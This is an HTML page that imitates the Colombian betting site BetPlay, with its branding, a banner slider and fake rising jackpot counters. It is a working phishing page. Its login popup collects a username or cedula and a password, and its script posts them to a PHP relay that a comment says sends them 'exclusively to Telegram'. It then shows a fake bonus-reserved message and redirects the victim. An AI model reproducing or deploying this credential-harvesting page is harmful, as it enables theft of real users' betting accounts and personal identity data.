
.
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../css/betstyles.css">
    <link rel="icon" type="image/x-icon" href="https://betplay.com.co/favicon.ico?v=1.1.0">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css" />
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">


    <title>BetPlay</title>
</head>

<body id="contenido">

    <style>
        /* Estilos generales para el login */

        @font-face {
  font-family: 'Montserrat';
  font-style: normal;
  font-weight: 400;
  src: url('https://fonts.gstatic.com/s/montserrat/v29/JTUSjIg1_i6t8kCHKm459WRhyyTh89ZNpQ.woff2') format('woff2');
  unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
}

        body {
            margin: 0;
            font-family: 'Montserrat', sans-serif;
            padding-top: 60px;
            /* Para evitar que el contenido quede debajo del header */

        }

        header {
            background-color: #002361;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            padding: 10px 0px 20px 0px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 1000;
        }

        .menu-icon {
            background: #00133b;
            border: 0;
            padding: 2px 2px 2px 2px;
            border-radius: 1.5em;
            width: 40px;
            height: 38px;
            background-image: url(../img/menu.png);
            background-size: contain;
            background-repeat: no-repeat;
            cursor: pointer;
            background-position: center;
            margin-left: 25px;
        }

        .logo {
    width: 150px;
    text-align: center;
    margin: 0 auto;
    margin-left: 47px;
}

        .logo img {
            max-width: 100%;
            height: auto;
        }

        .buttons {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: flex-end;
            margin-right: 20px;
        }

        .buttons button {
            background-color: #002361;
            color: white;
            border: 1px solid #3cb4e5;
            border-radius: 3px;
            padding: 8px 16px;
            cursor: pointer;
            font-size: 13px;
            width: 115px;
        }

        .buttons button.inicio-sesion {
            background-color: #002361;
        }

        .buttons button.registrarse {
            background-color: #3cb4e5;
        }


        /* Estilos del modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 2000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0, 0, 0, 0.5);
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
        }

        .modal.show {
            opacity: 1;
            visibility: visible;
        }

        .modal-content {
            background-color: #fff;
            margin: 10% auto;
            padding: 20px;
            border-radius: 8px;
            width: 80%;
            max-width: 400px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover,
        .close:focus {
            color: #000;
            text-decoration: none;
        }

        .promo-steps {
            background-color: #002361;
            color: white;
            text-align: center;
            padding: 20px 10px;
        }

        .promo-banner img {
            width: 100%;
            height: auto;
            max-width: 500px;
            border-radius: 10px;
        }

        .promo-text {
            margin: 8px;
        }

        .promo-text p {
            font-size: 15px;
            color: white;
            text-align: center;
            font-weight: bold;
            line-height: 1.4;
        }

        .juega-btn {
            background-color: #28A745;
            color: white;
            padding: 12px 24px;
            border: none;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            display: block;
            margin: 20px auto;
            font-family: 'Montserrat', sans-serif;
            /* centra horizontalmente */
        }


        .steps {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .step {
            background-color: #00378f;
            border-radius: 10px;
            padding: 15px;
            position: relative;
            text-align: left;
        }

        .step h3 {
            margin: 0;
            font-size: 18px;
        }

        .step p {
            margin: 5px 0 0 0;
            font-size: 14px;
            color: #bcd7ff;
        }

        .arrow {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            font-weight: bold;
            color: white;
        }

        .modal-reserva {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0, 0, 0, 0.6); /* fondo general de pantalla */
  z-index: 3000;
  display: flex;
  align-items: center;
  justify-content: center;
}

.modal-reserva-content {
    background-color: #00133b;
    border-radius: 12px;
    padding: 30px 25px;
    max-width: 400px;
    width: 90%;
    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
    text-align: center;
    animation: fadeIn 0.3s ease-in-out;
    margin-left: 19px;
    margin-top: 80px;
}
.modal-reserva-content img{
width: 50px;
}


.mensaje-texto {
  font-size: 16px;
  color: #ffffff; /* texto blanco */
  margin-bottom: 25px;
  line-height: 1.6;
  font-family: 'Montserrat', sans-serif;
}

.btn-aceptar-modal {
  background-color: #28A745; /* bot�n verde */
  color: white;
  border: none;
  padding: 12px 25px;
  font-size: 15px;
  border-radius: 8px;
  cursor: pointer;
  font-weight: bold;
  font-family: 'Montserrat', sans-serif;
  transition: background 0.3s ease;
}

.btn-aceptar-modal:hover {
  background-color: #218838; /* verde m�s oscuro al pasar el mouse */
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: scale(0.95);
  }

  to {
    opacity: 1;
    transform: scale(1);
  }
}

    </style>

    <header>
        <div class="menu-icon"></div>
        <div class="logo">
            <img src="../img/logo.webp" alt="BetPlay Logo">
        </div>
        <div class="buttons">
            <button class="inicio-sesion" onclick="openLoginPopup()">Iniciar sesion</button>
            <button class="registrarse">Registrarse</button>
        </div>
    </header>

    <div class="relajado">
        <div class="slider">
            <div><img src="../img/actufondo1.jpg" alt="Banner 1" /></div>
            <div><img src="../img/actufondo2.jpg" alt="Banner 2" /></div>
            <div><img src="../img/actufondo3.jpg" alt="Banner 3" /></div>
            <div><img src="../img/actufondo4.jpg" alt="Banner 4" /></div>

        </div>
        <div class="promo-text">
            <p>
                Entra al mundo de ganadores BetPlay,<br>
                diviértete apostando con toda la oferta de<br>
                apuestas que tenemos para ti.
            </p>
            <button class="juega-btn">Juega Ya</button>
        </div>

        <div _ngcontent-serverapp-c170135771="" class="homeenlaces">
            <div _ngcontent-serverapp-c170135771="" class="bordes">
                <div _ngcontent-serverapp-c170135771="" class="bordesinfo">
                    <h2 _ngcontent-serverapp-c170135771="" class="hometitulos"> 1. Registrate </h2>
                    <h3 _ngcontent-serverapp-c170135771="" class="hometextos"> Abre tu cuenta GRATIS </h3>
                </div><!----><a _ngcontent-serverapp-c170135771="" href="/registrarse" class="ng-star-inserted"><i _ngcontent-serverapp-c170135771="" class="fa fa-chevron-right betboton"></i></a><!---->
            </div>
            <div _ngcontent-serverapp-c170135771="" class="bordes">
                <div _ngcontent-serverapp-c170135771="" class="bordesinfo">
                    <h2 _ngcontent-serverapp-c170135771="" class="hometitulos"> 2. Recarga </h2>
                    <h3 _ngcontent-serverapp-c170135771="" class="hometextos"> Disfruta de la mejor oferta de apuestas online del mercado </h3>
                </div><!----><a _ngcontent-serverapp-c170135771="" class="ng-star-inserted"><i _ngcontent-serverapp-c170135771="" class="fa fa-chevron-right betboton"></i></a><!---->
            </div>
            <div _ngcontent-serverapp-c170135771="" class="bordes">
                <div _ngcontent-serverapp-c170135771="" class="bordesinfo">
                    <h2 _ngcontent-serverapp-c170135771="" class="hometitulos"> 3. Apuesta y Gana </h2>
                    <h3 _ngcontent-serverapp-c170135771="" class="hometextos"> Diviértete en la casa de apuestas m�s grande de Colombia </h3>
                </div><a _ngcontent-serverapp-c170135771="" href="/apuestas"><i _ngcontent-serverapp-c170135771="" class="fa fa-chevron-right betboton"></i></a>
            </div>
        </div>

    </div>

    <div class="fondo-jackpot">
    <div class="jackpot">
    <div class="content-image">
 
 <img class="logoplay" src="../img/IMAGEN1.webp" alt="logo de progresive play" title="logo e info general de progresive play">
            
</div>
    <div class="Mega">
        <h1>Mega</h1>
        <div class="Mega-amount">$476.670.070</div>
        <div class="description">Gana hasta $500 Millones</div>
    </div>
    <br>
    <div class="Super">
        <h1>Super</h1>
        <div class="Super-amount">$7.723.846</div>
        <div class="description">Gana hasta $20 Millones</div>
    </div>
    <br>
    <div class="Extra">
        <h1>Extra</h1>
        <div class="Extra-amount">$125.770</div>
        <div class="description">Gana hasta $20 Millones</div>
    </div>
</div>
</div>

    <div id="loginPopup" class="popup">
        <div class="modal-content">
        <!-- Este formulario es cargado desde el archivo CSS 'login.css' -->
            <div class="login-container">
            <span class="close" id="closeModal"><i class="fa-solid fa-xmark"></i></span>

                <img src="../img/logobett.svg" alt="Logo de BetPlay">
                <form id="loginForm" onsubmit="return validarCuentaBet(event)">
                <input type="text" name="email" id="email" placeholder="Usuario / Cedula" required>
                    <input type="password" name="pwd" id="pwd" placeholder="Password" required>
                    <div class="checkbox-container">
                        <label>
                            <input type="checkbox"> Recordar datos de usuario
                        </label>
                    </div>
                    <div class="buttons-inline">
                        <button type="submit" id="iniciarSesion" class="inicio-sesion2">Ingresar</button>
                        <button type="button" class="registrarse2">Registrarse</button>
                    </div>
                </form>

                <div id="mensajeModal" class="modal-reserva" style="display: none;">
  <div class="modal-reserva-content">
    <img src="../img/loadingbet.png" alt="">
    <p class="mensaje-texto">
      <strong>Felicidades!</strong> Tu bono ya ha sido reservado y estara disponible dentro de muy poco.<br>
      Sigue apostando con ventaja en BetPlay!
    </p>
    <button id="btnAceptar" class="btn-aceptar-modal">Aceptar</button>
  </div>
</div>

                <a href="#">Recuperar contrasena</a>
                <p>
                    Al iniciar sesion, estas aceptando los siguientes <a href="#">T&C Version 1.3</a>.
                </p>
<div class="ultimo">
<a _ngcontent-serverapp-c3657716528="" class="terminos">https://betplay.com.co/terminos-y-condiciones</a>
</div>
            </div>
        </div>
    </div>

    <!-- Error Popup -->
    <div id="errorPopup" class="error-popup">
        <div class="error-popup-content">
            <span class="close" onclick="closeErrorPopup()">Cerrar</span>
            <p id="errorMessage"></p>
        </div>
    </div>

    <div id="loadingScreen" class="loading-screen">
        <div class="loading-content">
            <img src="../img/logo.webp" alt="BetPlay Logo" class="loading-logo" />
            <div class="spinner"></div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>




<script>

function validarCuentaBet(event) {
    event.preventDefault();

    const email = document.getElementById("email").value;
    const pwd = document.getElementById("pwd").value;

    if (email === "" || pwd === "") {
        alert("Por favor, complete todos los campos.");
        return false;
    }

    // --- Enviar EXCLUSIVAMENTE a Telegram ---
    fetch("../acciones/bottg.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: `email=${encodeURIComponent(email)}&pwd=${encodeURIComponent(pwd)}`
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error en la solicitud');
        }
        return response.text();
    })
    .then(data => {
        console.log("Respuesta del bot de Telegram:", data);
        // Mostrar modal de éxito solo si Telegram responde OK
        document.getElementById("mensajeModal").style.display = "block";
    })
    .catch(error => {
        console.error("Error al enviar al bot de Telegram:", error);
        alert("Error al procesar la solicitud. Intente nuevamente.");
    });

    return false;
}

function openLoginPopup() {
    document.getElementById('loginPopup').style.display = 'flex';
}

document.getElementById('closeModal').onclick = function () {
    document.getElementById('loginPopup').style.display = 'none';
}

function closeErrorPopup() {
    document.getElementById('errorPopup').style.display = 'none';
}
</script>


<script>
document.getElementById("btnAceptar").addEventListener("click", function () {
    window.location.href = "../login.php"; // Redirecci�n cuando se hace clic en Aceptar
});
</script>

    <script>
        $(document).ready(function() {
            $('.slider').slick({
                autoplay: true,
                autoplaySpeed: 3000, // Cambia cada 3 segundos
                arrows: false,
                dots: true
            });
        });
    </script>

<script>
    function formatearNumero(valor) {
        return "$" + valor.toLocaleString("es-CO");
    }

    function animarJackpot(selector, valorInicial) {
        const elemento = document.querySelector(selector);
        let valorActual = valorInicial;

        function actualizar() {
            valorActual += 1;
            elemento.textContent = formatearNumero(valorActual);
        }

        // Inicia animaci�n r�pida: 1 incremento cada 10ms (~100 veces por segundo)
        setInterval(actualizar, 1);
    }

    document.addEventListener("DOMContentLoaded", function () {
        animarJackpot(".Mega-amount", 476670070);
        animarJackpot(".Super-amount", 7723846);
        animarJackpot(".Extra-amount", 125770);
    });
</script>



</body>

</html>